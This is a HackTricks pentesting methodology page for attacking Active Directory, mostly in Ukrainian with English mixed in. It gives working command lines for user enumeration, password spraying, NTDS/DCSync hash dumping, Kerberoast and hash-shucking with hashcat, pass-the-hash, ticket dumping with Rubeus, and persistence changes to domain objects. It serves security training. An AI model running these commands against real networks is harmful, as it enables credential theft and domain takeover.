# Методологія Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Загальний огляд

**Active Directory** слугує базовою технологією, що дозволяє **network administrators** ефективно створювати та керувати **domains**, **users** та **objects** у межах мережі. Вона спроєктована для масштабування, дозволяючи організовувати велику кількість користувачів у керовані **groups** та **subgroups**, одночасно контролюючи **access rights** на різних рівнях.

Структура **Active Directory** складається з трьох основних шарів: **domains**, **trees** та **forests**. **Domain** охоплює колекцію об’єктів, таких як **users** або **devices**, які використовують загальну базу даних. **Trees** — це групи таких доменів, пов’язаних спільною структурою, а **forest** представляє собою сукупність декількох trees, взаємопов’язаних через **trust relationships**, формуючи найвищий рівень організаційної структури. На кожному з цих рівнів можна визначати спеціальні **access** та **communication rights**.

Ключові поняття в **Active Directory** включають:

1. **Directory** – містить всю інформацію, пов’язану з об’єктами Active Directory.
2. **Object** – позначає сутності в директорії, включаючи **users**, **groups** або **shared folders**.
3. **Domain** – слугує контейнером для об’єктів директорії; у межах **forest** може існувати кілька доменів, кожен зі своєю колекцією об’єктів.
4. **Tree** – групування доменів, що мають спільний root domain.
5. **Forest** – верхівка організаційної структури в Active Directory, що складається з декількох trees з **trust relationships** між ними.

**Active Directory Domain Services (AD DS)** охоплює набір сервісів, критичних для централізованого керування та комунікації в мережі. Ці сервіси включають:

1. **Domain Services** – централізує збереження даних та керує взаємодією між **users** та **domains**, включаючи **authentication** та **search** функції.
2. **Certificate Services** – відповідає за створення, розповсюдження та управління безпечними **digital certificates**.
3. **Lightweight Directory Services** – підтримує директоріально-орієнтовані додатки через **LDAP protocol**.
4. **Directory Federation Services** – надає можливості **single-sign-on** для автентифікації користувачів у кількох веб-застосунках в одній сесії.
5. **Rights Management** – допомагає захищати матеріали з авторським правом, контролюючи незаконний розповсюдження та використання.
6. **DNS Service** – критично важливий для вирішення **domain names**.

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Щоб навчитися **attack an AD**, вам потрібно дуже добре **understand** процес **Kerberos authentication**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

You can take a lot to [https://wadcoms.github.io/](https://wadcoms.github.io) to have a quick view of which commands you can run to enumerate/exploit an AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

Якщо у вас є доступ до середовища AD, але немає облікових даних/сесій, ви можете:

- **Pentest the network:**
- Просканувати мережу, знайти машини та відкриті порти і спробувати **exploit vulnerabilities** або **extract credentials** з них (наприклад, [printers could be very interesting targets](ad-information-in-printers.md)).
- Перерахування DNS може дати інформацію про ключові сервери в домені, такі як web, printers, shares, vpn, media тощо.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Ознайомтеся з загальною [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md), щоб знайти більше інформації про те, як це робити.
- **Check for null and Guest access on smb services** (це не працюватиме на сучасних версіях Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Детальніший гайд по enumerating a SMB server можна знайти тут:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Детальніший гайд по enumerating LDAP можна знайти тут (зверніть **особливу увагу на anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Збирайте облікові дані, **impersonating services with Responder** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Отримайте доступ до хоста, **abusing the relay attack** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Збирайте облікові дані, **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Витягуйте імена користувачів/імена з внутрішніх документів, соціальних мереж, сервісів (зокрема web) всередині доменних середовищ, а також з загальнодоступних джерел.
- Якщо ви знайдете повні імена працівників компанії, ви можете спробувати різні AD **username conventions** ([**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Найпоширеніші конвенції: _NameSurname_, _Name.Surname_, _NamSur_ (3 літери від кожного), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Інструменти:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Перевірте сторінки [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) та [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Коли запитується **invalid username**, сервер відповідатиме кодом помилки **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, що дозволяє визначити, що ім’я користувача недійсне. **Valid usernames** отримають або **TGT in a AS-REP** відповідь, або помилку _KRB5KDC_ERR_PREAUTH_REQUIRED_, яка вказує, що від користувача вимагається pre-authentication.
- **No Authentication against MS-NRPC**: Використання auth-level = 1 (No authentication) проти MS-NRPC (Netlogon) інтерфейсу на domain controllers. Метод викликає функцію `DsrGetDcNameEx2` після біндингу до MS-NRPC інтерфейсу, щоб перевірити, чи існує user або computer без жодних облікових даних. Інструмент [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) реалізує такий тип enumeration. Дослідження можна знайти [тут](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Якщо ви знайшли один із таких серверів у мережі, ви також можете виконати **user enumeration against it**. Наприклад, ви можете використати інструмент [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> However, you should have the **name of the people working on the company** from the recon step you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) to generate potential valid usernames.

### Knowing one or several usernames

Гаразд — ви вже знаєте, що маєте дійсний username, але немаєте password... Спробуйте:

- [**ASREPRoast**](asreproast.md): If a user **doesn't have** the attribute _DONT_REQ_PREAUTH_ you can **request a AS_REP message** for that user that will contain some data encrypted by a derivation of the password of the user.
- [**Password Spraying**](password-spraying.md): Let's try the most **common passwords** with each of the discovered users, maybe some user is using a bad password (keep in mind the password policy!).
- Note that you can also **spray OWA servers** to try to get access to the users mail servers.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Ви можете мати змогу **отримати** деякі challenge **hashes** для cracking'у, отруївши (poisoning) деякі протоколи в мережі:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Якщо вам вдалося просканувати Active Directory, у вас буде **більше emails та краще розуміння network**. Можливо, ви зможете примусити NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack), щоб отримати доступ до AD env.

### NetExec workspace-driven recon & relay posture checks

- Use **`nxcdb` workspaces** to keep AD recon state per engagement: `workspace create <name>` spawns per-protocol SQLite DBs under `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Switch views with `proto smb|mssql|winrm` and list gathered secrets with `creds`. Manually purge sensitive data when done: `rm -rf ~/.nxc/workspaces/<name>`.
- Quick subnet discovery with **`netexec smb <cidr>`** surfaces **domain**, **OS build**, **SMB signing requirements**, and **Null Auth**. Members showing `(signing:False)` are **relay-prone**, while DCs often require signing.
- Generate **hostnames in /etc/hosts** straight from NetExec output to ease targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- When **SMB relay to the DC is blocked** by signing, still probe **LDAP** posture: `netexec ldap <dc>` highlights `(signing:None)` / слабке channel binding. DC з вимогою SMB signing, але з вимкненим LDAP signing залишається придатною мішенню для **relay-to-LDAP** абузів, таких як **SPN-less RBCD**.

### Client-side printer credential leaks → масова перевірка облікових даних домену

- Web-інтерфейси принтерів іноді **вбудовують замасковані admin passwords у HTML**. Перегляд source/devtools може виявити відкритий текст (наприклад, `<input value="<password>">`), що дозволяє доступ по Basic-auth до сховищ сканів/завдань друку.
- Отримані завдання друку можуть містити **plaintext onboarding docs** з паролями для кожного користувача. Тримайте pairings узгодженими при тестуванні:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Вкрасти NTLM Creds

Якщо ви можете отримати доступ до інших ПК або shares під null або guest користувачем, ви можете розмістити файли (наприклад SCF file), які при відкритті спровокують NTLM authentication до вас, щоб ви могли викрасти NTLM challenge для його злому:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** трактує кожен NT hash, який у вас уже є, як кандидат-пароль для інших, повільніших форматів, ключовий матеріал яких прямо походить від NT hash. Замість перебору довгих фразових паролів у Kerberos RC4 квитках, NetNTLM викликах або кешованих облікових даних, ви підставляєте NT хеші у Hashcat’s NT-candidate режими та дозволяєте йому перевіряти повторне використання паролів, ніколи не дізнаючись plaintext. Це особливо ефективно після компрометації домену, коли ви можете зібрати тисячі поточних і історичних NT хешів.

Використовуйте shucking коли:

- У вас є NT корпус з DCSync, SAM/SECURITY дампів або credential vaults і потрібно перевірити повторне використання в інших доменах/форестах.
- Ви захоплюєте RC4-based Kerberos матеріал (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM відповіді або DCC/DCC2 блоби.
- Ви хочете швидко довести повторне використання для довгих, незламних фразових паролів і негайно перейти через Pass-the-Hash.

Техніка **не працює** проти типів шифрування, ключі яких не є NT hash (наприклад, Kerberos etype 17/18 AES). Якщо домен вимагає лише AES, потрібно повертатися до звичайних режимів паролів.

#### Building an NT hash corpus

- **DCSync/NTDS** – Використовуйте `secretsdump.py` з history, щоб витягти якнайбільший набір NT хешів (та їх попередні значення):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Записи history значно розширюють пул кандидатів, оскільки Microsoft може зберігати до 24 попередніх хешів на обліковий запис. Для інших способів збору NTDS секретів див.:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (або Mimikatz `lsadump::sam /patch`) витягує локальні SAM/SECURITY дані та кешовані доменні входи (DCC/DCC2). Уніфікуйте та додайте ці хеші до того ж файлу `nt_candidates.txt`.
- **Track metadata** – Зберігайте username/domain, які дали кожен хеш (навіть якщо словник містить тільки hex). Збіги хешів одразу покажуть, який принципал повторно використовує пароль, коли Hashcat виведе виграшного кандидата.
- Віддавайте перевагу кандидатам з того ж форесту або з форесту з довірчими відносинами; це максимізує шанси накладання при shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.



## Перелічення Active Directory З ОБЛІКОВИМИ ДАНИМИ/СЕСІЄЮ

На цьому етапі ви повинні мати **скомпрометовані облікові дані або сесію валідного domain account.** Якщо у вас є якісь валідні облікові дані або shell як domain user, **пам'ятайте, що попередні опції все ще доступні для компрометації інших користувачів.**

Перед початком автентифікованого перечислення слід знати, що таке **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Компрометація облікового запису — це **великий крок до компрометації всього домену**, оскільки ви зможете почати **Active Directory Enumeration:**

Що стосується [**ASREPRoast**](asreproast.md), ви тепер можете знайти всіх можливих вразливих користувачів, а стосовно [**Password Spraying**](password-spraying.md) ви можете отримати **список всіх імен користувачів** і спробувати пароль скомпрометованого облікового запису, пусті паролі та нові перспективні паролі.

- Ви можете використати [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Також можна використовувати [**powershell for recon**](../basic-powershell-for-pentesters/index.html), що буде більш stealthy
- Можна також [**use powerview**](../basic-powershell-for-pentesters/powerview.md) для витягування детальнішої інформації
- Ще один чудовий інструмент для recon в Active Directory — [**BloodHound**](bloodhound.md). Він **не дуже stealthy** (залежно від методів збору, які ви використовуєте), але **якщо вас це не хвилює**, варто спробувати. Знайдіть, куди користувачі можуть RDP, шляхи до інших груп тощо.
- **Інші автоматизовані інструменти для AD enumeration:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) — вони можуть містити цікаву інформацію.
- **Інструмент з GUI** для перерахування директорії — **AdExplorer.exe** із **SysInternal** Suite.
- Також можна шукати в LDAP базі через **ldapsearch**, щоб знайти облікові дані в полях _userPassword_ & _unixUserPassword_, або навіть в _Description_. Див. також [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) для інших методів.
- Якщо ви використовуєте **Linux**, можна також перерахувати домен за допомогою [**pywerview**](https://github.com/the-useless-one/pywerview).
- Можна також спробувати автоматизовані інструменти:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Витяг всіх доменних користувачів**

Отримати всі імена користувачів домену дуже просто у Windows (`net user /domain` ,`Get-DomainUser` або `wmic useraccount get name,sid`). У Linux можна використати: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` або `enum4linux -a -u "user" -p "password" <DC IP>`

> Навіть якщо цей розділ Enumeration виглядає коротким, це найважливіша частина усього. Перегляньте посилання (особливо ті, що стосуються cmd, powershell, powerview і BloodHound), вивчіть, як перераховувати домен і практикуйтесь, поки не відчуєте себе впевнено. Під час оцінювання це буде ключовий момент для знаходження шляху до DA або для вирішення, що нічого зробити не вдасться.

### Kerberoast

Kerberoasting включає отримання **TGS tickets**, які використовують сервіси, пов'язані з user accounts, і offline злом їх шифрування — яке базується на паролях користувачів.

Більше про це в:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Після отримання деяких облікових даних ви можете перевірити, чи маєте доступ до будь-якої **машини**. Для цього можна використовувати **CrackMapExec**, щоб спробувати підключитись до кількох серверів різними протоколами згідно з результатами порт-скану.

### Local Privilege Escalation

Якщо ви скомпрометували облікові дані або маєте сесію як звичайний domain user і маєте **доступ** цим користувачем до **будь-якої машини в домені**, слід спробувати шлях до **локального підвищення привілеїв і пошуку облікових даних**. Лише з правами local administrator ви зможете **дампити хеші інших користувачів** у пам'яті (LSASS) і локально (SAM).

У цій книзі є повна сторінка про [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) і [**checklist**](../checklist-windows-privilege-escalation.md). Також не забудьте використовувати [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Дуже **малоймовірно**, що ви знайдете **квитки** в поточного користувача, які дають вам дозвіл на доступ до несподіваних ресурсів, але ви все одно можете перевірити:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Якщо вам вдалося перебрати Active Directory, у вас буде **більше email-адрес і краще розуміння мережі**. Можливо, ви зможете примусово виконати NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Тепер, коли у вас є базові облікові дані, слід перевірити, чи можете ви **знайти** будь-які **цікаві файли, які поширюються всередині AD**. Ви можете робити це вручну, але це дуже нудне повторюване завдання (і ще гірше, якщо знайдете сотні документів, які треба перевірити).

[**Перейдіть за цим посиланням, щоб дізнатися про інструменти, які ви можете використовувати.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Якщо ви можете **доступитися до інших ПК або шарів (shares)**, ви можете **розмістити файли** (наприклад SCF файл), які, якщо їх якось відкриють, **спровокують NTLM authentication проти вас**, і ви зможете **вкрасти** **NTLM challenge**, щоб його зламати:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ця вразливість дозволяла будь-якому автентифікованому користувачу **компрометувати domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Для наведених нижче технік звичайного domain user недостатньо — вам потрібні спеціальні привілеї/облікові дані, щоб виконати ці атаки.**

### Hash extraction

Сподіваюся, вам вдалося **компрометувати якийсь local admin** аккаунт, використовуючи [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) (включаючи relaying), [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Тоді настав час здампити всі hashes з пам'яті та локально.\
[**Прочитайте цю сторінку про різні способи отримання hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Щойно у вас є hash користувача**, ви можете використати його для **перевтілення (impersonate)**.\
Потрібно використовувати якийсь **tool**, який **виконає** **NTLM authentication з використанням** цього **hash**, **або** ви можете створити новий **sessionlogon** і **інжектнути** цей **hash** всередину **LSASS**, тож коли буде виконуватися будь-яка **NTLM authentication**, буде використано цей **hash.** Останній варіант — те, що робить mimikatz.\
[**Прочитайте цю сторінку для отримання додаткової інформації.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Ця атака спрямована на **використання NTLM hash користувача для запиту Kerberos ticket'ів**, як альтернативу звичайному Pass The Hash через NTLM протокол. Тому це може бути особливо **корисно в мережах, де NTLM протокол вимкнений** і дозволений лише **Kerberos** як протокол аутентифікації.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

У методі атаки **Pass The Ticket (PTT)** нападники **крадуть authentication ticket користувача** замість його пароля чи hash-значень. Цей вкрадений ticket потім використовується для **перевтілення користувача**, отримуючи несанкціонований доступ до ресурсів і сервісів у мережі.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Якщо у вас є **hash** або **password** **локального адміністратора**, ви повинні спробувати **увійти локально** на інші **PCs** з його допомогою.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Зауважте, що це досить **шумно**, і **LAPS** **пом'якшить** це.

### MSSQL Abuse & Trusted Links

Якщо користувач має привілеї для **access MSSQL instances**, він може використати їх, щоб **execute commands** на хості MSSQL (якщо запущено як SA), **steal** NetNTLM **hash** або навіть виконати **relay attack**.\
Також, якщо MSSQL instance є trusted (database link) для іншого MSSQL instance: якщо користувач має привілеї над trusted database, він зможе **use the trust relationship to execute queries also in the other instance**. Ці довірчі зв'язки можна ланцюжити, і в якийсь момент користувач може знайти неправильно налаштовану базу даних, де зможе виконувати команди.\
**The links between databases work even across forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Сторонні системи інвентаризації та деплойменту часто відкривають потужні шляхи до облікових даних та виконання коду. Див. також:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Якщо ви знаходите будь-який Computer object з атрибутом [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) і маєте доменні привілеї на цьому комп'ютері, ви зможете дампити TGTs з пам'яті всіх користувачів, які заходять на цей комп'ютер.\
Отже, якщо **Domain Admin** заходить на цей комп'ютер, ви зможете дампити його TGT і видати себе за нього, використовуючи [Pass the Ticket](pass-the-ticket.md).\
Завдяки constrained delegation ви навіть могли б **автоматично скомпрометувати Print Server** (сподіваємось, це буде DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Якщо користувач або комп'ютер дозволені для "Constrained Delegation", вони зможуть **імітувати будь-якого користувача для доступу до певних сервісів на комп'ютері**.\
Тож, якщо ви **компрометуєте hash** цього користувача/комп'ютера, ви зможете **імітувати будь-якого користувача** (навіть domain admins) для доступу до певних сервісів.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Маючи **WRITE** привілей на об'єкті Active Directory віддаленого комп'ютера дозволяє досягти виконання коду з **підвищеними привілеями**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Скомпрометований користувач може мати деякі **цікаві привілеї над певними об'єктами домену**, що дозволить вам **рухатись латерально/підвищувати привілеї**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Виявлення **Spool service, що слухає** в межах домену може бути **зловжите** для **отримання нових облікових даних** та **підвищення привілеїв**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Якщо **інші користувачі** **заходять** на **скомпрометовану** машину, можливо **зібрати облікові дані з пам'яті** та навіть **інжектувати beacons у їхні процеси**, щоб видавати себе за них.\
Зазвичай користувачі підключаються через RDP, тож тут показано, як виконати кілька атак на сесії третьої сторони RDP:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** забезпечує систему керування **локальним паролем Administrator** на комп'ютерах, приєднаних до домену, гарантує, що він **рандомізований**, унікальний та часто **змінюється**. Ці паролі зберігаються в Active Directory, і доступ контролюється через ACL лише для авторизованих користувачів. Маючи достатні права для доступу до цих паролів, можливе pivot'ування на інші комп'ютери.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Збір сертифікатів** із скомпрометованої машини може бути способом підвищення привілеїв у середовищі:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Якщо налаштовані **вразливі шаблони**, їх можна зловживати для підвищення привілеїв:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Отримавши **Domain Admin** або ще краще **Enterprise Admin** привілеї, ви можете **дампити** **domain database**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Деякі з технік, обговорених вище, можна використовувати для персистенції.\
Наприклад, ви можете:

- Зробити користувачів вразливими до [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Зробити користувачів вразливими до [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Надати користувачу привілеї для [**DCSync**](#dcsync)

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Атака **Silver Ticket** створює **легітимний TGS ticket** для конкретного сервісу, використовуючи **NTLM hash** (наприклад, **hash облікового запису ПК**). Цей метод використовується для **доступу до привілеїв сервісу**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Атака **Golden Ticket** полягає в тому, що атакуючий отримує доступ до **NTLM hash облікового запису krbtgt** в середовищі Active Directory. Цей обліковий запис особливий, оскільки він використовується для підпису всіх **Ticket Granting Tickets (TGTs)**, які необхідні для аутентифікації у мережі AD.

Отримавши цей hash, атакуючий може створювати **TGTs** для будь-якого облікового запису (атака Silver ticket).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Це схожі на golden tickets, але підроблені таким чином, щоб **оминути загальні механізми виявлення golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Маючи сертифікати облікового запису або можливість їх запитувати** — це дуже хороший спосіб зберегти персистенцію в обліковому записі користувача (навіть якщо він змінить пароль):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Використання сертифікатів також дозволяє зберігати персистенцію з високими привілеями всередині домену:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

